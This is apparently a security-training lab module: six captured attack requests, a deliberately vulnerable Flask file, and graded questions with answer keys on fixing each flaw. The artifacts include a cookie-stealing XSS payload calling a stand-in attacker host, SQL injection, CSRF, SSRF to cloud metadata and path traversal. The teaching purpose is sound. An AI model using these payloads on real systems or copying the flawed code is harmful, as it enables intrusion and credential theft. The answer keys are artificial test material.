// Lab: identify six web vulnerabilities from captured traffic and code, then pick the right fix.

const snipA = `GET /search?q=%3Cscript%3Efetch(%27https%3A%2F%2Fcollect.attacker.example%2Fc%3F%27%2Bdocument.cookie)%3C%2Fscript%3E HTTP/1.1
Host: shop.example.com
Cookie: sid=4f1c9a0e77b2

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: sid=4f1c9a0e77b2; Path=/; Secure

<h2>Results for <script>fetch('https://collect.attacker.example/c?'+document.cookie)</script></h2>
<p>0 products found.</p>
`

const snipB = `POST /login HTTP/1.1
Host: portal.example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything

--- server code (LoginController.java, Microsoft SQL Server) ---
String q = "SELECT id, role FROM users WHERE username = '" + username
         + "' AND pw_hash = '" + sha256(password) + "'";
ResultSet rs = stmt.executeQuery(q);

--- response ---
HTTP/1.1 302 Found
Location: /admin/dashboard
`

const snipC = `Post on forum.example.net/thread/88 (written by an outsider):
  Great tips! <img src="https://portal.example.com/account/email/change?new=takeover%40attacker.example" width="1" height="1">

Request sent by a logged-in victim's browser when the thread loads:
GET /account/email/change?new=takeover%40attacker.example HTTP/1.1
Host: portal.example.com
Cookie: session=9b77d0c41e
Referer: https://forum.example.net/thread/88

HTTP/1.1 302 Found
Location: /account?msg=Email+updated
`

const snipD = `POST /api/link-preview HTTP/1.1
Host: app.example.com
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-prod-role"}

HTTP/1.1 200 OK
Content-Type: application/json

{"title": null, "body": "{\\"Code\\":\\"Success\\",\\"Type\\":\\"AWS-HMAC\\",\\"AccessKeyId\\":\\"ASIAEXAMPLEEXAMPLE\\",\\"SecretAccessKey\\":\\"(redacted)\\",\\"Token\\":\\"(redacted)\\"}"}
`

const snipE = `GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: docs.example.com

HTTP/1.1 200 OK
Content-Type: application/octet-stream

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
`

const snipF = `GET /api/invoices/1043 HTTP/1.1
Host: billing.example.com
Authorization: Bearer eyJhbGciOi... (token for customer_id 2207)

HTTP/1.1 200 OK
Content-Type: application/json

{"invoice_id": 1043, "customer_id": 1981, "bill_to": "R. Okafor, 12 Elm St", "total": "4120.00", "card_last4": "4417"}

(Requests for /api/invoices/1040 through /1060 with the same token all return 200.)
`

const code = `from flask import Flask, request, send_from_directory
from markupsafe import escape
import os, sqlite3, requests

app = Flask(__name__)
REPORTS = "/srv/reports"

@app.get("/search")
def search():
    return f"<h2>Results for {request.args.get('q', '')}</h2>"

@app.get("/product")
def product():
    db = sqlite3.connect("shop.db")
    row = db.execute("SELECT name, price FROM products WHERE id = ?", (request.args["id"],)).fetchone()
    return f"<h2>{escape(row[0])}</h2><p>{escape(row[1])}</p>"

@app.get("/orders")
def orders():
    db = sqlite3.connect("shop.db")
    return {"orders": db.execute("SELECT * FROM orders WHERE status = '" + request.args["status"] + "'").fetchall()}

@app.get("/report")
def report():
    return send_from_directory(REPORTS, request.args["name"])

@app.get("/export")
def export():
    return open(os.path.join(REPORTS, request.args["name"])).read()

@app.post("/preview")
def preview():
    return requests.get(request.json["url"], timeout=3).text[:500]
`

const VULNS = ['Reflected XSS', 'Stored XSS', 'SQL injection', 'Command injection', 'CSRF', 'SSRF', 'Path traversal', 'IDOR']
const FIXES = [
  'Context-aware output encoding, plus a Content Security Policy',
  'Parameterized queries (prepared statements)',
  'Use POST with an anti-CSRF token; SameSite session cookie',
  'Allow-list destination URLs; block private and link-local ranges',
  'Canonicalize the path and confine it to the base directory',
  'Server-side check that the object belongs to the caller',
  'Rate-limit the endpoint',
  'Add a WAF signature and change nothing else',
]

export default {
  id: 'web-vuln-fix',
  title: 'Identify and fix web application flaws',
  objectives: ['2.3', '2.4'],
  difficulty: 'Advanced',
  minutes: 18,
  scenario: 'A penetration test of the customer portal came back with six findings, each with captured traffic. The developers also sent the Flask module behind the shop site for review. Name each flaw, choose the fix that removes the root cause, and review the code.',
  artifacts: [
    { id: 'a', title: 'Finding A: shop search', content: snipA },
    { id: 'b', title: 'Finding B: portal login', content: snipB },
    { id: 'c', title: 'Finding C: email change', content: snipC },
    { id: 'd', title: 'Finding D: link preview', content: snipD },
    { id: 'e', title: 'Finding E: document download', content: snipE },
    { id: 'f', title: 'Finding F: billing API', content: snipF },
    { id: 'code', title: 'shop/app.py', content: code },
  ],
  tasks: [
    {
      id: 'classify', type: 'grid',
      prompt: 'For each finding, name the vulnerability and choose the best fix.',
      columns: [
        { key: 'vuln', label: 'Vulnerability', options: VULNS },
        { key: 'fix', label: 'Best fix', options: FIXES },
      ],
      rows: [
        { label: 'A: /search reflects a script tag', answer: { vuln: 'Reflected XSS', fix: FIXES[0] } },
        { label: 'B: login with admin\'--', answer: { vuln: 'SQL injection', fix: FIXES[1] } },
        { label: 'C: email change from a forum image', answer: { vuln: 'CSRF', fix: FIXES[2] } },
        { label: 'D: link preview of 169.254.169.254', answer: { vuln: 'SSRF', fix: FIXES[3] } },
        { label: 'E: /download?file=../../../../etc/passwd', answer: { vuln: 'Path traversal', fix: FIXES[4] } },
        { label: 'F: /api/invoices/1043 with another customer\'s token', answer: { vuln: 'IDOR', fix: FIXES[5] } },
      ],
      explain: 'A is reflected XSS: the payload comes from the request and is echoed straight back. It is not stored, because nothing is saved server-side. The fix is to HTML-encode output for its context, with CSP as defense in depth. B: `admin\'--` closes the string and comments out the password check, so the fix is parameterized queries. C is CSRF: a state change on a GET that the browser sends with the victim\'s cookie from another site. Fix it with POST, a per-session token and SameSite cookies. D is SSRF: the server fetches a URL the attacker chose and returns cloud-metadata credentials, so allow-list destinations and block 169.254.0.0/16 and RFC 1918 ranges. E is path traversal, fixed by resolving the real path and confirming it stays under the base directory (or by mapping IDs to files). F is an IDOR: the invoice ID is checked for existence but not ownership, so add an object-level authorization check on every request. Rate limiting and a WAF signature might slow an attacker but leave the flaw in place.',
    },
    {
      id: 'review', type: 'lines', artifact: 'code',
      prompt: 'Code review of shop/app.py: select every line that introduces a vulnerability. Lines that handle user input safely should NOT be selected.',
      answer: [9, 20, 28, 32],
      explain: 'Line 10 puts the raw q parameter into HTML (XSS). Line 21 concatenates status into SQL (SQL injection). Line 29 joins user input onto the base path; `../` climbs out of it, and in Python `os.path.join(REPORTS, "/etc/passwd")` discards REPORTS entirely (path traversal). Line 33 fetches any URL the client supplies (SSRF). Line 15 is safe because it uses a ? placeholder, line 16 escapes its output, and line 25 uses `send_from_directory`, which rejects paths that escape the directory. The skill being tested is following untrusted input to a dangerous sink (HTML output, SQL, the file system, outbound requests).',
    },
    {
      id: 'params', type: 'single',
      prompt: 'A developer proposes stripping quotes and the words SELECT, UNION and OR from inputs instead of rewriting the queries. Why are parameterized queries the better fix?',
      options: [
        'Parameterized queries run faster, and speed is the main reason to use them',
        'The query structure is sent to the database separately from the data, so input can never be parsed as SQL; blocklists miss alternate encodings, comments, case tricks and numeric contexts that need no quotes',
        'Blocklists are fine but must also strip semicolons',
        'Parameterized queries encrypt the input before it reaches the database',
      ],
      answer: 1,
      explain: 'With a prepared statement the SQL text is fixed first and the user\'s value is bound later as data, so it can\'t change the query\'s structure. Blocklists try to enumerate bad input and always miss something: `SeLeCt`, `/**/` comments, URL or Unicode encoding, or `id=1 OR 1=1` where no quote is needed. Use allow-list input validation as defense in depth, not as the primary control. Prepared statements may be cached and reused, but that isn\'t why they are secure, and they don\'t encrypt anything.',
    },
    {
      id: 'bac', type: 'multi',
      prompt: 'Which of these findings fall under OWASP Top 10 A01, Broken Access Control? Select all that apply.',
      options: [
        'IDOR: /api/invoices/1043 returns another customer\'s invoice',
        'A standard user can open /admin/users and delete accounts by typing the URL',
        'Changing the cookie value role=user to role=admin grants admin functions',
        'CORS policy reflects any Origin and allows credentials on the account API',
        'The login form is vulnerable to SQL injection',
        'Passwords are stored as unsalted MD5 hashes',
        'The site uses a JavaScript library with a known critical CVE',
      ],
      answer: [0, 1, 2, 3],
      explain: 'Broken access control means users can act outside their intended permissions: object-level (IDOR), function-level (forced browsing to /admin), trusting client-side role data, and permissive CORS are all A01 examples. SQL injection is Injection, unsalted MD5 is a Cryptographic Failure, and an outdated library falls under Vulnerable and Outdated Components (Software Supply Chain Failures in the 2025 list). OWASP also maps path traversal (CWE-22) and CSRF (CWE-352) into A01, and the 2025 edition folds SSRF into it as well. Know the category names, not just the examples.',
    },
    {
      id: 'httponly', type: 'single',
      prompt: 'Finding A\'s payload steals document.cookie. Which change to the Set-Cookie header would have stopped this particular theft, even with the XSS still present?',
      options: ['Add Secure', 'Add HttpOnly', 'Add Path=/search', 'Add Max-Age=0'],
      answer: 1,
      explain: 'HttpOnly hides the cookie from JavaScript, so `document.cookie` comes back without it. The cookie already has Secure, which only keeps it off plain HTTP. HttpOnly limits the damage but doesn\'t fix XSS: injected script can still act as the user in that browser. Output encoding remains the fix.',
    },
    {
      id: 'imds', type: 'single',
      prompt: 'Finding D leaked temporary AWS credentials through the instance metadata service. Besides fixing the SSRF, which cloud-side control most directly blunts this technique?',
      options: [
        'Enforce IMDSv2, which needs a session token obtained by a PUT request with a custom header, and set the response hop limit to 1',
        'Move the instance to a different region',
        'Rotate the IAM user\'s console password',
        'Enable S3 default encryption',
      ],
      answer: 0,
      explain: 'IMDSv2 requires a token fetched with an HTTP PUT and the X-aws-ec2-metadata-token-ttl-seconds header. A typical SSRF can only make simple GETs with a chosen URL, so it can\'t get the token. A hop limit of 1 also stops containers and forwarded requests from reaching it. Also scope the instance role to least privilege. The leaked keys belong to a role, not a user with a console password, and they expire on their own. Revoke them by revoking the role\'s active sessions.',
    },
  ],
}
